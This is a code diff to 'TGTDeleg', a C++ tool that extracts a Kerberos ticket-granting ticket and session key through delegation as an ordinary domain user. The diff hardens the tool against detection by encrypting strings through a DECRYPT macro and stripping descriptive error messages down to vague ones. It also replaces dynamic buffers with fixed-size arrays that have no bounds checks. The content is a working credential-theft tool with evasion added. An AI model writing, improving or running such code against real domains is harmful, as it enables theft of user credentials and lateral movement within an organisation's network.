@@ -1,6 +1,5 @@
-// TGTDeleg - Standalone Kerberos TGT extraction via delegation
-// Runs without elevation as a regular domain user
-// Outputs AP-REQ and Session Key for external processing
+// Cross-session TGT extraction via Kerberos delegation
+// Runs as regular domain user, no elevation needed
 //
 // Compile: x86_64-w64-mingw32-g++ -O2 -s -static tgtdeleg.cpp -o tgtdeleg.exe
 
@@ -281,16 +280,18 @@ std::string GetTargetSPN(const char* userTarget) {
     char dnsDomain[256] = {0};
     
     // Get LOGONSERVER (e.g., "\\SENTINEL-LAB-DC")
-    DWORD len = p_GetEnvironmentVariableA("LOGONSERVER", logonServer, sizeof(logonServer));
+    DECRYPT(sLogonServer, "LOGONSERVER");
+    DWORD len = p_GetEnvironmentVariableA(sLogonServer, logonServer, sizeof(logonServer));
     if (len == 0 || len >= sizeof(logonServer)) {
-        fprintf(stderr, "[-] Failed to get LOGONSERVER\n");
+        fprintf(stderr, "[-] Failed to get env1\n");
         return "";
     }
     
     // Get USERDNSDOMAIN (e.g., "sentinel.lab")
-    len = p_GetEnvironmentVariableA("USERDNSDOMAIN", dnsDomain, sizeof(dnsDomain));
+    DECRYPT(sDnsDomain, "USERDNSDOMAIN");
+    len = p_GetEnvironmentVariableA(sDnsDomain, dnsDomain, sizeof(dnsDomain));
     if (len == 0 || len >= sizeof(dnsDomain)) {
-        fprintf(stderr, "[-] Failed to get USERDNSDOMAIN\n");
+        fprintf(stderr, "[-] Failed to get env2\n");
         return "";
     }
     
@@ -315,10 +316,8 @@ int RunTgtDeleg(const std::string& target) {
     DECRYPT(pkgKerb, "Kerberos");
     
     // Convert package name to wide
-    int wlenPkg = p_MultiByteToWideChar(CP_UTF8, 0, pkgKerb, -1, NULL, 0);
-    std::wstring wPkg(wlenPkg, 0);
-    p_MultiByteToWideChar(CP_UTF8, 0, pkgKerb, -1, &wPkg[0], wlenPkg);
-    if (wlenPkg > 0) wPkg.resize(wlenPkg - 1);
+    WCHAR wPkg[32];
+    p_MultiByteToWideChar(CP_UTF8, 0, pkgKerb, -1, wPkg, 32);
     
     // === Step 1: Acquire Credentials Handle ===
     CredHandle hCred;
@@ -326,7 +325,7 @@ int RunTgtDeleg(const std::string& target) {
     
     SECURITY_STATUS status = p_AcquireCredentialsHandleW(
         NULL, 
-        (SEC_WCHAR*)wPkg.c_str(), 
+        (SEC_WCHAR*)wPkg, 
         SECPKG_CRED_OUTBOUND, 
         NULL, NULL, NULL, NULL, 
         &hCred, 
@@ -334,7 +333,7 @@ int RunTgtDeleg(const std::string& target) {
     );
 
     if (status != SEC_E_OK) {
-        fprintf(stderr, "[-] AcquireCredentialsHandleW failed: 0x%08X\n", status);
+        fprintf(stderr, "[-] Cred failed: 0x%08X\n", status);
         return 1;
     }
 
@@ -345,10 +344,8 @@ int RunTgtDeleg(const std::string& target) {
     ULONG fContextAttr;
     
     // Convert target to Wide
-    int wlenTarget = p_MultiByteToWideChar(CP_UTF8, 0, target.c_str(), -1, NULL, 0);
-    std::wstring wTarget(wlenTarget, 0);
-    p_MultiByteToWideChar(CP_UTF8, 0, target.c_str(), -1, &wTarget[0], wlenTarget);
-    if (wlenTarget > 0) wTarget.resize(wlenTarget - 1);
+    WCHAR wTarget[512];
+    p_MultiByteToWideChar(CP_UTF8, 0, target.c_str(), -1, wTarget, 512);
 
     char buffer[16384];
     sbOut.BufferType = SECBUFFER_TOKEN;
@@ -365,7 +362,7 @@ int RunTgtDeleg(const std::string& target) {
     status = p_InitializeSecurityContextW(
         &hCred, 
         NULL, 
-        (SEC_WCHAR*)wTarget.c_str(), 
+        (SEC_WCHAR*)wTarget, 
         fContextReq, 
         0, 
         SECURITY_NATIVE_DREP, 
@@ -378,7 +375,7 @@ int RunTgtDeleg(const std::string& target) {
     );
 
     if (status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {
-        fprintf(stderr, "[-] InitializeSecurityContextW failed: 0x%08X\n", status);
+        fprintf(stderr, "[-] ISC failed: 0x%08X\n", status);
         return 1;
     }
     
@@ -391,7 +388,7 @@ int RunTgtDeleg(const std::string& target) {
     HANDLE hLsa;
     NTSTATUS ntStatus = p_LsaConnectUntrusted(&hLsa);
     if (ntStatus != 0) {
-        fprintf(stderr, "[-] LsaConnectUntrusted failed: 0x%08X\n", ntStatus);
+        fprintf(stderr, "[-] Connect failed: 0x%08X\n", ntStatus);
         return 1;
     }
     
@@ -403,22 +400,23 @@ int RunTgtDeleg(const std::string& target) {
     ULONG authPkgId;
     ntStatus = p_LsaLookupAuthenticationPackage(hLsa, &name, &authPkgId);
     if (ntStatus != 0) {
-        fprintf(stderr, "[-] LsaLookupAuthenticationPackage failed: 0x%08X\n", ntStatus);
+        fprintf(stderr, "[-] Lookup failed: 0x%08X\n", ntStatus);
         return 1;
     }
     
     // === Step 5: Retrieve Session Key ===
-    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wTarget.length() * sizeof(WCHAR));
-    std::vector<BYTE> requestBuffer(reqSize);
-    PKERB_RETRIEVE_TKT_REQUEST pReq = (PKERB_RETRIEVE_TKT_REQUEST)requestBuffer.data();
+    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(wTarget) * sizeof(WCHAR));
+    BYTE requestBuffer[2048];
+    PKERB_RETRIEVE_TKT_REQUEST pReq = (PKERB_RETRIEVE_TKT_REQUEST)requestBuffer;
+    memset(requestBuffer, 0, reqSize);
     
     pReq->MessageType = KerbRetrieveEncodedTicketMessage; 
     pReq->CacheOptions = 0;
     pReq->EncryptionType = 0;
-    pReq->TargetName.Length = wTarget.length() * sizeof(WCHAR);
+    pReq->TargetName.Length = wcslen(wTarget) * sizeof(WCHAR);
     pReq->TargetName.MaximumLength = pReq->TargetName.Length;
     pReq->TargetName.Buffer = (PWSTR)(pReq + 1);
-    memcpy(pReq->TargetName.Buffer, wTarget.c_str(), pReq->TargetName.Length);
+    memcpy(pReq->TargetName.Buffer, wTarget, pReq->TargetName.Length);
     
     PVOID pResponse = NULL;
     ULONG responseSize = 0;
@@ -435,7 +433,7 @@ int RunTgtDeleg(const std::string& target) {
     );
     
     if (ntStatus != 0 || protocolStatus != 0) {
-        fprintf(stderr, "[-] LsaCallAuthenticationPackage failed. NTSTATUS: 0x%08X, ProtocolStatus: 0x%08X\n", ntStatus, protocolStatus);
+        fprintf(stderr, "[-] Call failed. NT: 0x%08X, PS: 0x%08X\n", ntStatus, protocolStatus);
     } else {
         PKERB_RETRIEVE_TKT_RESPONSE pResp = (PKERB_RETRIEVE_TKT_RESPONSE)pResponse;
         
@@ -466,7 +464,7 @@ int main(int argc, char* argv[]) {
     setvbuf(stdout, NULL, _IONBF, 0);
     
     if (!InitAPIs()) {
-        fprintf(stderr, "[-] Failed to initialize APIs\n");
+        fprintf(stderr, "[-] Init failed\n");
         return 1;
     }
 
@@ -482,7 +480,7 @@ int main(int argc, char* argv[]) {
     
     std::string target = GetTargetSPN(userTarget);
     if (target.empty()) {
-        fprintf(stderr, "[-] Failed to determine target SPN. Use -t HOST/target.domain.com\n");
+        fprintf(stderr, "[-] No target. Use -t HOST/target.domain.com\n");
         fprintf(stderr, "Usage: %s [-t HOST/target.domain.com]\n", argv[0]);
         return 1;
     }
